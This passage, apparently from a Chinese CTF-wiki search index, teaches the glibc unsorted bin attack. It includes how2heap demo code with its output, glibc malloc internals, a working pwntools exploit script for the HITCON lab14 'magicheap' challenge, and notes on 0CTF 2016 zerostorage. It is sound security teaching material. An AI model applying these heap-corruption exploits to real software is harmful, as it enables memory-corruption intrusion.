B\u90e8\u5206\u7684\u5185\u5bb9\u65f6\uff0c\u7531\u4e8eB\u7684\u5b58\u50a8\u6570\u636e\u90e8\u5206\u7684\u5730\u5740\u5176\u5b9e\u5c31\u662fA\u5bf9\u5e94\u7684\u5b58\u50a8\u6570\u636e\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6253\u5370\u7684\u5c31\u662fA\u7684\u6570\u636e\u90e8\u5206\u7684\u5185\u5bb9\u3002\u4f46\u662f\uff0c\u6211\u4eec\u4e4b\u524d\u521a\u521a\u628aA\u5bf9\u5e94\u7684\u5185\u5b58\u91ca\u653e\u6389\uff0c\u800cA\u7531\u4e8e\u4e0d\u5728fast bin\u8303\u56f4\u5185\uff0c\u6240\u4ee5\u53ea\u4f1a\u88ab\u653e\u5230unsorted bin\u4e2d\uff08\u800c\u4e14\u6b64\u65f6\u53ea\u6709\u4e00\u4e2a\uff09\uff0c\u6240\u4ee5\u6b64\u65f6A\u7684fd\u548cbk\u90fd\u5b58\u653e\u7684\u662funsorted bin\u7684\u4e00\u4e2a\u57fa\u5730\u5740\u3002 \u5982\u679c\u6211\u4eec\u5728merge\u4e4b\u524d\u66fe\u7ecf\u5220\u9664\u8fc7\u4e00\u4e2astorage C\uff0c\u90a3\u4e48\u5728\u6211\u4eecmerge A\u540e\uff0cA\u5c31\u4f1a\u63d2\u5728unsorted bin\u7684\u53cc\u5411\u94fe\u8868\u7684\u9996\u90e8\uff0c\u6240\u4ee5\u5176fd\u5219\u662fC\u5bf9\u5e94\u7684\u5730\u5740\uff0cbk\u5219\u662funsorted bin\u7684\u4e00\u4e2a\u57fa\u5730\u5740\u3002\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u6cc4\u9732\u4e24\u4e2a\u5730\u5740\u3002 \u800c\u4e14\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u8fd8\u662f\u53ef\u4ee5\u53bb\u4fee\u6539merge\u540e\u7684B\u7684\u5185\u5bb9\u7684\uff0c\u6240\u4ee5\u8fd9\u5176\u5b9e\u5c31\u662f\u4e2aUse After Free\u3002 \u5229\u7528\u6d41\u7a0b \u00b6 \u3002\u3002\u3002\u3002 \u9898\u76ee \u00b6 \u53c2\u8003\u6587\u732e \u00b6 http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/ https://github.com/HQ1995/Heap_Senior_Driver/tree/master/0ctf2016/zerostorage https://github.com/scwuaptx/CTF/blob/master/2016-writeup/0ctf/zerostorage.py","title":"Unsorted Bin Attack"},{"location":"pwn/heap/unsorted_bin_attack/#unsorted-bin-attack","text":"","title":"Unsorted Bin Attack"},{"location":"pwn/heap/unsorted_bin_attack/#_1","text":"Unsorted Bin Attack\uff0c\u987e\u540d\u601d\u4e49\uff0c\u8be5\u653b\u51fb\u4e0e Glibc \u5806\u7ba1\u7406\u4e2d\u7684\u7684 Unsorted Bin \u7684\u673a\u5236\u7d27\u5bc6\u76f8\u5173\u3002 Unsorted Bin Attack \u88ab\u5229\u7528\u7684\u524d\u63d0\u662f\u63a7\u5236 Unsorted Bin Chunk \u7684 bk \u6307\u9488\u3002 Unsorted Bin Attack \u53ef\u4ee5\u8fbe\u5230\u7684\u6548\u679c\u662f\u5b9e\u73b0\u4fee\u6539\u4efb\u610f\u5730\u5740\u503c\u4e3a\u4e00\u4e2a\u8f83\u5927\u7684\u6570\u503c\u3002","title":"\u6982\u8ff0"},{"location":"pwn/heap/unsorted_bin_attack/#unsorted-bin","text":"\u5728\u4ecb\u7ecd Unsorted Bin \u653b\u51fb\u524d\uff0c\u53ef\u4ee5\u5148\u56de\u987e\u4e00\u4e0b Unsorted Bin \u7684\u57fa\u672c\u6765\u6e90\u4ee5\u53ca\u57fa\u672c\u4f7f\u7528\u60c5\u51b5\u3002","title":"Unsorted Bin \u56de\u987e"},{"location":"pwn/heap/unsorted_bin_attack/#_2","text":"\u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8e MINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002 \u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8etop chunk\u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002 \u5f53\u8fdb\u884c malloc_consolidate \u65f6\uff0c\u53ef\u80fd\u4f1a\u628a\u5408\u5e76\u540e\u7684 chunk \u653e\u5230 unsorted bin \u4e2d\uff0c\u5982\u679c\u4e0d\u662f\u548c top chunk \u8fd1\u90bb\u7684\u8bdd\u3002","title":"\u57fa\u672c\u6765\u6e90"},{"location":"pwn/heap/unsorted_bin_attack/#_3","text":"Unsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO\uff0c \u5373\u63d2\u5165\u7684\u65f6\u5019\u63d2\u5165\u5230 unsorted bin \u7684\u5934\u90e8\uff0c\u53d6\u51fa\u7684\u65f6\u5019\u4ece\u94fe\u8868\u5c3e\u83b7\u53d6 \u3002 \u5728\u7a0b\u5e8f malloc \u65f6\uff0c\u5982\u679c\u5728 fastbin\uff0csmall bin \u4e2d\u627e\u4e0d\u5230\u5bf9\u5e94\u5927\u5c0f\u7684 chunk\uff0c\u5c31\u4f1a\u5c1d\u8bd5\u4ece Unsorted Bin \u4e2d\u5bfb\u627e chunk\u3002\u5982\u679c\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u521a\u597d\u6ee1\u8db3\uff0c\u5c31\u4f1a\u76f4\u63a5\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u5426\u5219\u5c31\u4f1a\u628a\u8fd9\u4e9b chunk \u5206\u522b\u63d2\u5165\u5230\u5bf9\u5e94\u7684 bin \u4e2d\u3002","title":"\u57fa\u672c\u4f7f\u7528\u60c5\u51b5"},{"location":"pwn/heap/unsorted_bin_attack/#_4","text":"\u8fd9\u91cc\u6211\u4ee5 shellphish \u7684 how2heap \u4ed3\u5e93\u4e2d\u7684 unsorted_bin_attack.c \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u6211\u505a\u4e00\u4e9b\u7b80\u5355\u7684\u4fee\u6539\uff0c\u5982\u4e0b #include <stdio.h> #include <stdlib.h> int main () { fprintf ( stderr , \"This file demonstrates unsorted bin attack by write a large \" \"unsigned long value into stack \\n \" ); fprintf ( stderr , \"In practice, unsorted bin attack is generally prepared for further \" \"attacks, such as rewriting the \" \"global variable global_max_fast in libc for further fastbin attack \\n\\n \" ); unsigned long target_var = 0 ; fprintf ( stderr , \"Let's first look at the target we want to rewrite on stack: \\n \" ); fprintf ( stderr , \"%p: %ld \\n\\n \" , & target_var , target_var ); unsigned long * p = malloc ( 400 ); fprintf ( stderr , \"Now, we allocate first normal chunk on the heap at: %p \\n \" , p ); fprintf ( stderr , \"And allocate another normal chunk in order to avoid \" \"consolidating the top chunk with\" \"the first one during the free() \\n\\n \" ); malloc ( 500 ); free ( p ); fprintf ( stderr , \"We free the first chunk now and it will be inserted in the \" \"unsorted bin with its bk pointer \" \"point to %p \\n \" , ( void * ) p [ 1 ]); /*------------VULNERABILITY-----------*/ p [ 1 ] = ( unsigned long )( & target_var - 2 ); fprintf ( stderr , \"Now emulating a vulnerability that can overwrite the \" \"victim->bk pointer \\n \" ); fprintf ( stderr , \"And we write it with the target address-16 (in 32-bits \" \"machine, it should be target address-8):%p \\n\\n \" , ( void * ) p [ 1 ]); //------------------------------------ malloc ( 400 ); fprintf ( stderr , \"Let's malloc again to get the chunk we just free. During \" \"this time, target should has already been \" \"rewrite: \\n \" ); fprintf ( stderr , \"%p: %p \\n \" , & target_var , ( void * ) target_var ); } \u7a0b\u5e8f\u6267\u884c\u540e\u7684\u6548\u679c\u4e3a \u279c unsorted_bin_attack git: ( master ) \u2717 gcc unsorted_bin_attack.c -o unsorted_bin_attack \u279c unsorted_bin_attack git: ( master ) \u2717 ./unsorted_bin_attack This file demonstrates unsorted bin attack by write a large unsigned long value into stack In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack Let 's first look at the target we want to rewrite on stack: 0x7ffe0d232518: 0 Now, we allocate first normal chunk on the heap at: 0x1fce010 And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free() We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78 Now emulating a vulnerability that can overwrite the victim->bk pointer And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508 Let' s malloc again to get the chunk we just free. During this time, target should has already been rewrite: 0x7ffe0d232518: 0x7f1c705ffb78 \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u56fe\u6765\u63cf\u8ff0\u4e00\u4e0b\u5177\u4f53\u53d1\u751f\u7684\u6d41\u7a0b\u4ee5\u53ca\u80cc\u540e\u7684\u539f\u7406\u3002 \u521d\u59cb\u72b6\u6001\u65f6 unsorted bin \u7684 fd \u548c bk \u5747\u6307\u5411 unsorted bin \u672c\u8eab\u3002 \u6267\u884cfree(p) \u7531\u4e8e\u91ca\u653e\u7684 chunk \u5927\u5c0f\u4e0d\u5c5e\u4e8e fast bin \u8303\u56f4\u5185\uff0c\u6240\u4ee5\u4f1a\u9996\u5148\u653e\u5165\u5230 unsorted bin \u4e2d\u3002 \u4fee\u6539p[1] \u7ecf\u8fc7\u4fee\u6539\u4e4b\u540e\uff0c\u539f\u6765\u5728 unsorted bin \u4e2d\u7684 p \u7684 bk \u6307\u9488\u5c31\u4f1a\u6307\u5411 target addr-16 \u5904\u4f2a\u9020\u7684 chunk\uff0c\u5373 Target Value \u5904\u4e8e\u4f2a\u9020 chunk \u7684 fd \u5904\u3002 \u7533\u8bf7400\u5927\u5c0f\u7684chunk \u6b64\u65f6\uff0c\u6240\u7533\u8bf7\u7684 chunk \u5904\u4e8e small bin \u6240\u5728\u7684\u8303\u56f4\uff0c\u5176\u5bf9\u5e94\u7684 bin \u4e2d\u6682\u65f6\u6ca1\u6709 chunk\uff0c\u6240\u4ee5\u4f1a\u53bbunsorted bin\u4e2d\u627e\uff0c\u53d1\u73b0 unsorted bin \u4e0d\u7a7a\uff0c\u4e8e\u662f\u628a unsorted bin \u4e2d\u7684\u6700\u540e\u4e00\u4e2a chunk \u62ff\u51fa\u6765\u3002 while (( victim = unsorted_chunks ( av ) -> bk ) != unsorted_chunks ( av )) { bck = victim -> bk ; if ( __builtin_expect ( chunksize_nomask ( victim ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize_nomask ( victim ) > av -> system_mem , 0 )) malloc_printerr ( check_action , \"malloc(): memory corruption\" , chunk2mem ( victim ), av ); size = chunksize ( victim ); /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ /* \u663e\u7136\uff0cbck\u88ab\u4fee\u6539\uff0c\u5e76\u4e0d\u7b26\u5408\u8fd9\u91cc\u7684\u8981\u6c42*/ if ( in_smallbin_range ( nb ) && bck == unsorted_chunks ( av ) && victim == av -> last_remainder && ( unsigned long ) ( size ) > ( unsigned long ) ( nb + MINSIZE )) { .... } /* remove from unsorted list */ unsorted_chunks ( av ) -> bk = bck ; bck -> fd = unsorted_chunks ( av ); victim = unsorted_chunks(av)->bk=p bck = victim->bk=p->bk = target addr-16 unsorted_chunks(av)->bk = bck=target addr-16 bck->fd = *(target addr -16+16) = unsorted_chunks(av); \u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u5c06 unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u62ff\u51fa\u6765\u7684\u8fc7\u7a0b\u4e2d\uff0cvictim \u7684 fd \u5e76\u6ca1\u6709\u53d1\u6325\u4f5c\u7528\uff0c\u6240\u4ee5\u5373\u4f7f\u6211\u4eec\u4fee\u6539\u4e86\u5176\u4e3a\u4e00\u4e2a\u4e0d\u5408\u6cd5\u7684\u503c\u4e5f\u6ca1\u6709\u5173\u7cfb\u3002 \u7136\u800c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cunsorted bin \u94fe\u8868\u53ef\u80fd\u5c31\u6b64\u7834\u574f\uff0c\u5728\u63d2\u5165 chunk \u65f6\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u95ee\u9898\u3002 \u5373\u4fee\u6539 target \u5904\u7684\u503c\u4e3a unsorted bin \u7684\u94fe\u8868\u5934\u90e8 0x7f1c705ffb78\uff0c\u4e5f\u5c31\u662f\u4e4b\u524d\u8f93\u51fa\u7684\u4fe1\u606f\u3002 We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78 Now emulating a vulnerability that can overwrite the victim->bk pointer And we write it with the target address-16 ( in 32 -bits machine, it should be target address-8 ) :0x7ffe0d232508 Let ' s malloc again to get the chunk we just free. During this time, target should has already been rewrite: 0x7ffe0d232518: 0x7f1c705ffb78 \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230 unsorted bin attack \u786e\u5b9e\u53ef\u4ee5\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u503c\uff0c\u4f46\u662f\u6240\u4fee\u6539\u6210\u7684\u503c\u5374\u4e0d\u53d7\u6211\u4eec\u63a7\u5236\uff0c\u552f\u4e00\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0c\u8fd9\u4e2a\u503c\u6bd4\u8f83\u5927\u3002 \u800c\u4e14\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c \u8fd9\u770b\u8d77\u6765\u4f3c\u4e4e\u5e76\u6ca1\u6709\u4ec0\u4e48\u7528\u5904\uff0c\u4f46\u662f\u5176\u5b9e\u8fd8\u662f\u6709\u70b9\u5375\u7528\u7684\uff0c\u6bd4\u5982\u8bf4 \u6211\u4eec\u901a\u8fc7\u4fee\u6539\u5faa\u73af\u7684\u6b21\u6570\u6765\u4f7f\u5f97\u7a0b\u5e8f\u53ef\u4ee5\u6267\u884c\u591a\u6b21\u5faa\u73af\u3002 \u6211\u4eec\u53ef\u4ee5\u4fee\u6539 heap \u4e2d\u7684 global_max_fast \u6765\u4f7f\u5f97\u66f4\u5927\u7684 chunk \u53ef\u4ee5\u88ab\u89c6\u4e3a fast bin\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u53bb\u6267\u884c\u4e00\u4e9b fast bin attack\u4e86\u3002","title":"\u539f\u7406"},{"location":"pwn/heap/unsorted_bin_attack/#hitcon-training-lab14-magic-heap","text":"\u8fd9\u91cc\u6211\u4eec\u4fee\u6539\u4e00\u4e0b\u6e90\u7a0b\u5e8f\u4e2d\u7684 l33t \u51fd\u6570\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u3002 void l33t () { system ( \"cat ./flag\" ); }","title":"HITCON Training lab14 magic heap"},{"location":"pwn/heap/unsorted_bin_attack/#_5","text":"\u279c hitcontraining_lab14 git: ( master ) file magicheap magicheap: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped \u279c hitcontraining_lab14 git: ( master ) checksec magicheap [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u662f\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u768464\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u4e0e Canary \u4fdd\u62a4\u3002","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"pwn/heap/unsorted_bin_attack/#_6","text":"\u7a0b\u5e8f\u5927\u6982\u5c31\u662f\u81ea\u5df1\u5199\u7684\u5806\u7ba1\u7406\u5668\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u529f\u80fd \u521b\u5efa\u5806\u3002\u6839\u636e\u7528\u6237\u6307\u5b9a\u5927\u5c0f\u7533\u8bf7\u76f8\u5e94\u5806\uff0c\u5e76\u4e14\u8bfb\u5165\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u8bbe\u7f6e NULL\u3002 \u7f16\u8f91\u5806\u3002\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u5224\u65ad\u5bf9\u5e94\u5806\u662f\u4e0d\u662f\u975e\u7a7a\uff0c\u5982\u679c\u975e\u7a7a\uff0c\u5c31\u6839\u636e\u7528\u6237\u8bfb\u5165\u7684\u5927\u5c0f\uff0c\u6765\u4fee\u6539\u5806\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u5176\u5b9e\u5c31\u51fa\u73b0\u4e86\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002 \u5220\u9664\u5806\u3002\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u5224\u65ad\u5bf9\u5e94\u5806\u662f\u4e0d\u662f\u975e\u7a7a\uff0c\u5982\u679c\u975e\u7a7a\uff0c\u5c31\u5c06\u5bf9\u5e94\u5806\u91ca\u653e\u5e76\u7f6e\u4e3a NULL\u3002 \u540c\u65f6\uff0c\u6211\u4eec\u770b\u5230\uff0c\u5f53\u6211\u4eec\u63a7\u5236 v3 \u4e3a 4869\uff0c\u540c\u65f6\u63a7\u5236 magic \u5927\u4e8e 4869\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230 flag \u4e86\u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"pwn/heap/unsorted_bin_attack/#_7","text":"\u5f88\u663e\u7136\uff0c \u6211\u4eec\u76f4\u63a5\u5229\u7528 unsorted bin attack \u5373\u53ef\u3002 \u91ca\u653e\u4e00\u4e2a\u5806\u5757\u5230 unsorted bin \u4e2d\u3002 \u5229\u7528\u5806\u6ea2\u51fa\u6f0f\u6d1e\u4fee\u6539 unsorted bin \u4e2d\u5bf9\u5e94\u5806\u5757\u7684 bk \u6307\u9488\u4e3a &magic-16\u3002 \u89e6\u53d1\u6f0f\u6d1e\u5373\u53ef\u3002 \u4ee3\u7801\u5982\u4e0b #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './magicheap' ) def create_heap ( size , content ): r . recvuntil ( \":\" ) r . sendline ( \"1\" ) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def edit_heap ( idx , size , content ): r . recvuntil ( \":\" ) r . sendline ( \"2\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def del_heap ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"3\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) create_heap ( 0x20 , \"dada\" ) # 0 create_heap ( 0x80 , \"dada\" ) # 1 # in order not to merge into top chunk create_heap ( 0x20 , \"dada\" ) # 2 del_heap ( 1 ) magic = 0x6020c0 fd = 0 bk = magic - 0x10 edit_heap ( 0 , 0x20 + 0x20 , \"a\" * 0x20 + p64 ( 0 ) + p64 ( 0x91 ) + p64 ( fd ) + p64 ( bk )) create_heap ( 0x80 , \"dada\" ) #trigger unsorted bin attack r . recvuntil ( \":\" ) r . sendline ( \"4869\" ) r . interactive ()","title":"\u5229\u7528"},{"location":"pwn/heap/unsorted_bin_attack/#2016-0ctf-zerostorage-","text":"\u6ce8\uff1a\u5f85\u8fdb\u4e00\u6b65\u5b8c\u6210\u3002 \u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 0CTF \u7684zerostorage\u4e3a\u4f8b\uff0c\u8fdb\u884c\u4ecb\u7ecd\u3002 \u8fd9\u4e2a\u9898\u5f53\u65f6\u7ed9\u4e86\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u7248\u672c\u548c\u5185\u6838\u7248\u672c\uff0c\u6240\u4ee5\u81ea\u5df1\u53ef\u4ee5\u4e0b\u4e00\u4e2a\u4e00\u6a21\u4e00\u6837\u7684\u8fdb\u884c\u8c03\u8bd5\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u76f4\u63a5\u7528\u81ea\u5df1\u7684\u672c\u5730\u673a\u5668\u8c03\u8bd5\u4e86\u3002\u4f46\u662f\u5728\u76ee\u524d\u7684Ubuntu 16.04 \u4e2d\uff0c\u7531\u4e8e\u8fdb\u4e00\u6b65\u7684\u968f\u673a\u5316\uff0c\u5bfc\u81f4 libc \u52a0\u8f7d\u7684\u4f4d\u7f6e\u4e0e\u7a0b\u5e8f\u6a21\u5757\u52a0\u8f7d\u7684\u4f4d\u7f6e\u4e4b\u95f4\u7684\u76f8\u5bf9\u504f\u79fb\u4e0d\u518d\u56fa\u5b9a\uff0c\u6240\u4ee5 BrieflyX \u7684\u7b56\u7565\u5c31\u65e0\u6cd5\u518d\u6b21\u4f7f\u7528\uff0c\u4f3c\u4e4e\u53ea\u80fd\u7528 angelboy \u7684\u7b56\u7565\u4e86\u3002","title":"2016 0CTF zerostorage-\u5f85\u5b8c\u6210"},{"location":"pwn/heap/unsorted_bin_attack/#_8","text":"\u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u5f00\u542f\u4e86\u6240\u6709\u7684\u4fdd\u62a4 pwndbg> checksec [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/zerostorage/zerostorage' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled","title":"\u5b89\u5168\u6027\u68c0\u67e5"},{"location":"pwn/heap/unsorted_bin_attack/#_9","text":"\u7a0b\u5e8f\u7ba1\u7406\u5728 bss \u6bb5\u7684\u5b58\u50a8\u7a7a\u95f4 storage \uff0c\u5177\u6709\u63d2\u5165\uff0c\u5220\u9664\uff0c\u5408\u5e76\uff0c\u5220\u9664\uff0c\u67e5\u770b\uff0c\u679a\u4e3e\uff0c\u9000\u51fa\u529f\u80fd\u3002\u8fd9\u4e2astorage\u7684\u7ed3\u6784\u4f53\u5982\u4e0b 00000000 Storage struc ; (sizeof=0x18, mappedto_7) 00000000 ; XREF: .bss:storage_list/r 00000000 use dq ? 00000008 size dq ? 00000010 xor_addr dq ? 00000018 Storage ends","title":"\u57fa\u672c\u529f\u80fd\u5206\u6790"},{"location":"pwn/heap/unsorted_bin_attack/#insert-1","text":"\u57fa\u672c\u529f\u80fd\u5982\u4e0b \u9010\u4e00\u67e5\u770b storage \u6570\u7ec4\uff0c\u67e5\u627e\u7b2c\u4e00\u4e2a\u672a\u4f7f\u7528\u7684\u5143\u7d20\uff0c\u4f46\u662f\u8fd9\u4e2a\u6570\u7ec4\u6700\u5927\u4e5f\u5c31\u662f32\u3002 \u8bfb\u53d6storage \u5143\u7d20\u6240\u9700\u8981\u5b58\u50a8\u5185\u5bb9\u7684\u957f\u5ea6\u3002 \u5982\u679c\u957f\u5ea6\u4e0d\u5927\u4e8e0\uff0c\u76f4\u63a5\u9000\u51fa\uff1b \u5426\u5219\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5c0f\u4e8e128\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a128\uff1b \u5426\u5219\uff0c\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u4e0d\u5927\u4e8e4096\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6570\u503c\uff1b \u5426\u5219\uff0c\u8bbe\u7f6e\u4e3a4096\u3002 \u4f7f\u7528 calloc \u5206\u914d\u6307\u5b9a\u957f\u5ea6\uff0c\u6ce8\u610f calloc \u4f1a\u521d\u59cb\u5316 chunk \u4e3a0\u3002 \u5c06 calloc \u5206\u914d\u7684\u5185\u5b58\u5730\u5740\u4e0e bss \u6bb5\u7684\u4e00\u4e2a\u5185\u5b58\uff08\u521d\u59cb\u65f6\u523b\u4e3a\u4e00\u4e2a\u968f\u673a\u6570\uff09\u8fdb\u884c\u6291\u6216\uff0c\u5f97\u5230\u4e00\u4e2a\u65b0\u7684\u5185\u5b58\u5730\u5740\u3002 \u6839\u636e\u8bfb\u53d6\u7684storage\u7684\u5927\u5c0f\u6765\u8bfb\u5165\u5185\u5bb9\u3002 \u5c06\u5bf9\u5e94\u7684storage\u7684\u5927\u5c0f\u4ee5\u53ca\u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\u4fdd\u5b58\u5230\u5bf9\u5e94\u7684storage \u5143\u7d20\u4e2d\uff0c\u5e76\u6807\u8bb0\u8be5\u5143\u7d20\u5904\u4e8e\u53ef\u7528\u72b6\u6001\u3002 \u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u8bb0\u5f55\u7684storage\u7684\u5927\u5c0f\u662f\u81ea\u5df1\u8f93\u5165\u7684\u5927\u5c0f\uff01\uff01\uff01 \u9012\u589e storage num\u7684\u6570\u91cf\u3002","title":"insert-1"},{"location":"pwn/heap/unsorted_bin_attack/#update-2","text":"\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u5b58\u50a8\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002 \u8bfb\u5165\u8981\u66f4\u65b0\u7684storage\u5143\u7d20\u7684id\uff0c\u5982\u679cid\u5927\u4e8e31\u6216\u8005\u76ee\u524d\u5904\u4e8e\u4e0d\u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u8bf4\u660e\u4e0d\u5bf9\uff0c\u76f4\u63a5\u8fd4\u56de\u3002 \u8bfb\u53d6 \u66f4\u65b0\u540e storage \u5143\u7d20\u6240\u9700\u8981\u5b58\u50a8\u5185\u5bb9\u7684\u957f\u5ea6\u3002 \u5982\u679c\u957f\u5ea6\u4e0d\u5927\u4e8e0\uff0c\u76f4\u63a5\u9000\u51fa\uff1b \u5426\u5219\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5c0f\u4e8e128\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a128\uff1b \u5426\u5219\uff0c\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u4e0d\u5927\u4e8e4096\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6570\u503c\uff1b \u5426\u5219\uff0c\u8bbe\u7f6e\u4e3a4096\u3002 \u6839\u636e bss \u6bb5\u5bf9\u5e94\u7684\u968f\u673a\u6570\u83b7\u53d6\u539f\u5148storage \u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\uff0c \u5982\u679c\u66f4\u65b0\u540e\u6240\u9700\u7684\u957f\u5ea6\u4e0d\u7b49\u4e8e\u66f4\u65b0\u524d\u7684\u957f\u5ea6\uff0c\u5c31\u4f7f\u7528realloc\u4e3a\u5176\u91cd\u65b0\u5206\u914d\u5185\u5b58\u3002 \u518d\u6b21\u8bfb\u53d6\u6570\u636e\uff0c\u540c\u65f6\u66f4\u65b0storage \u5143\u7d20\u3002","title":"update-2"},{"location":"pwn/heap/unsorted_bin_attack/#merge-3","text":"\u5982\u679c\u6b63\u5728\u4f7f\u7528\u7684\u5143\u7d20\u4e0d\u5927\u4e8e1\u4e2a\uff0c\u90a3\u4e48\u65e0\u6cd5\u5408\u5e76\uff0c\u76f4\u63a5\u9000\u51fa\u5373\u53ef\u3002 \u5224\u65adstorage\u662f\u5426\u5df2\u7ecf\u6ee1\u4e86\uff0c\u5982\u679c\u4e0d\u6ee1\uff0c\u627e\u51fa\u7a7a\u95f2\u7684\u90a3\u4e00\u5757\u3002 \u5206\u522b\u8bfb\u53d6merge_from\u7684id\u4ee5\u53camerge_to\u7684id\u53f7\uff0c\u5e76\u8fdb\u884c\u76f8\u5e94\u5927\u5c0f\u4ee5\u53ca\u4f7f\u7528\u72b6\u6001\u7684\u68c0\u6d4b\u3002 \u6839\u636e\u6700\u521d\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u6765\u8ba1\u7b97\u4e24\u4e2a merge \u5230\u4e00\u8d77\u540e\u6240\u9700\u8981\u7684\u7a7a\u95f4\uff0c \u5982\u679c\u4e0d\u5927\u4e8e128\uff0c\u90a3\u5c31\u4e0d\u4f1a\u7533\u8bf7\u65b0\u7684\u7a7a\u95f4 \uff0c\u5426\u5219\u5c31\u7533\u8bf7\u76f8\u5e94\u5927\u5c0f\u7684\u65b0\u7684\u7a7a\u95f4\u3002 \u4f9d\u6b21\u5c06merge_to\u4e0emerge_from\u7684\u5185\u5bb9\u62f7\u8d1d\u5230\u76f8\u5bf9\u5e94\u7684\u4f4d\u7f6e\u3002 